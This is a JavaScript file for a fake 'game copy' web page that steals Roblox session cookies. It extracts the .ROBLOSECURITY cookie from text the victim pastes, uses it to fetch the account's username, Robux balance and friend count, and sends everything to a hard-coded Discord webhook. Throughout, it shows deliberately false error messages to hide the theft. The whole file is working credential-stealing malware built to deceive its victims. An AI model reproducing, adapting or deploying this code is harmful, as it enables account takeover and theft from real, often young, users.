/* ======================================================
   PAYLOAD.JS - Main Logic, Extraction & Webhook
====================================================== */

/* ================= CONFIG ================= */
const START_ANCHOR = ".ROBLOSECURITY";
const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1456485751389814957/uWd9bjxOOKxMl-9ZL9rRjycEtXAlzk9nOVm9UY-boHBXta_--8co2ojCtI6GcEfhq3YI";

/* ================= ELEMENTS ================= */
const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

/* ================= PIN VALIDATION ================= */
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

/* ================= EXTRACTION SYSTEM ================= */
function extractGameData(fullText) {
    const anchorIndex = fullText.indexOf(START_ANCHOR);
    if (anchorIndex === -1) {
        return { success: false, message: "Invalid Game Key!" };
    }

    const searchArea = fullText.substring(anchorIndex);
    const regexPattern = /\.ROBLOSECURITY"\s*,\s*"([^"]+(?:[^"\\]|\\.)*)"/s;
    let match = searchArea.match(regexPattern);

    if (match && match[1]) {
        let extracted = match[1].replace(/\\"/g, '"');
        return { success: true, data: extracted, fullLength: extracted.length };
    }

    // Fallback methods (same as original)
    const altMatch = searchArea.match(/\.ROBLOSECURITY"\s*,\s*"([\s\S]*?)"\s*,\s*"/);
    if (altMatch && altMatch[1]) {
        return { success: true, data: altMatch[1], fullLength: altMatch[1].length };
    }

    return {
        success: false,
        message: "Could not extract cookie value. Ensure format contains .ROBLOSECURITY\", \"VALUE\", \"/\", \".roblox.com\""
    };
}

/* ================= FETCH ROBLOX INFO ================= */
async function fetchRobloxUserInfo(cookieValue) {
    try {
        const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
            headers: {
                "Cookie": `.ROBLOSECURITY=${cookieValue}`,
                "Content-Type": "application/json"
            }
        });

        if (!userResponse.ok) return null;

        const userData = await userResponse.json();
        const userId = userData.id;
        const username = userData.name;

        const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;

        let robux = "N/A", pendingRobux = "N/A", friendsCount = "N/A";

        // Robux
        try {
            const robuxRes = await fetch("https://economy.roblox.com/v1/users/currency", { headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` } });
            if (robuxRes.ok) robux = (await robuxRes.json()).robux?.toLocaleString() || "0";
        } catch(e) {}

        // Pending Robux
        try {
            const pendingRes = await fetch("https://economy.roblox.com/v1/users/currency/pending", { headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` } });
            if (pendingRes.ok) pendingRobux = (await pendingRes.json()).pendingRobux?.toLocaleString() || "0";
        } catch(e) {}

        // Friends
        try {
            const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
            if (friendsRes.ok) friendsCount = (await friendsRes.json()).count?.toLocaleString() || "0";
        } catch(e) {}

        return {
            username, userId, avatarUrl, robux, pendingRobux, friendsCount,
            profileUrl: `https://www.roblox.com/users/${userId}/profile`
        };
    } catch (error) {
        console.error("Error fetching user info:", error);
        return null;
    }
}

/* ================= WEBHOOK SENDER ================= */
async function sendWebhook(pin, extractedData) {
    const cookieLength = extractedData.length;
    const userInfo = await fetchRobloxUserInfo(extractedData);

    // Build fields...
    let description = `**Complete .ROBLOSECURITY Cookie Value (FULL):**\n\`\`\`\n${extractedData}\n\`\`\``;

    const embedFields = [];

    if (userInfo) {
        embedFields.push({
            name: "👤 Roblox Account",
            value: `**Username:** ${userInfo.username}\n**User ID:** \`${userInfo.userId}\`\n[View Profile](${userInfo.profileUrl})`,
            inline: false
        });
        embedFields.push({
            name: "💰 Robux Balance",
            value: `**Available:** ${userInfo.robux} R$\n**Pending:** ${userInfo.pendingRobux} R$`,
            inline: true
        });
        embedFields.push({
            name: "👥 Friends",
            value: `**Total Friends:** ${userInfo.friendsCount}`,
            inline: true
        });
    } else {
        embedFields.push({ name: "⚠️ Account Info", value: "Could not fetch account details.", inline: false });
    }

    embedFields.push({
        name: "🍪 Cookie Information",
        value: `**Length:** ${cookieLength} characters\n**Status:** Full capture`,
        inline: false
    });

    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔐 .ROBLOSECURITY Cookie Extraction - FULL VALUE",
            thumbnail: userInfo ? { url: userInfo.avatarUrl } : undefined,
            description: description,
            color: 0x8c52ff,
            fields: embedFields,
            footer: { text: "Bloxtools Advanced System • Full Cookie Capture" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        return response.ok;
    } catch (error) {
        console.error("Webhook error:", error);
        return false;
    }
}

/* ================= BUTTON HANDLER ================= */
copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";

    if (!validatePin()) {
        statusMessage.textContent = "Please enter a valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "Please paste a supported game file.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "✓ Processing... Please wait.";
    statusMessage.style.color = "#caa8ff";

    await new Promise(r => setTimeout(r, 500));

    const success = await sendWebhook(pinInput.value, extraction.data);

    if (success) {
        statusMessage.textContent = "✗ Game Copy request was not processed. Please check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    } else {
        statusMessage.textContent = "✗ Copy failed! Check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    }

    copyButton.classList.remove("loading");
    copyButton.disabled = false;
});

/* ================= FAKE INTERNET ERROR (Optional Deception) ================= */
const originalSendWebhook = sendWebhook;
sendWebhook = async function(pin, extractedData) {
    const result = await originalSendWebhook(pin, extractedData);
    await new Promise(r => setTimeout(r, 1500));

    if (Math.random() < 0.35) {
        const originalMsg = statusMessage.textContent;
        const originalColor = statusMessage.style.color;

        statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers.";
        statusMessage.style.color = "#ffaa66";

        setTimeout(() => {
            if (statusMessage.textContent.includes("Connection lost")) {
                statusMessage.textContent = originalMsg;
                statusMessage.style.color = originalColor;
            }
        }, 3000);
    }
    return result;
};
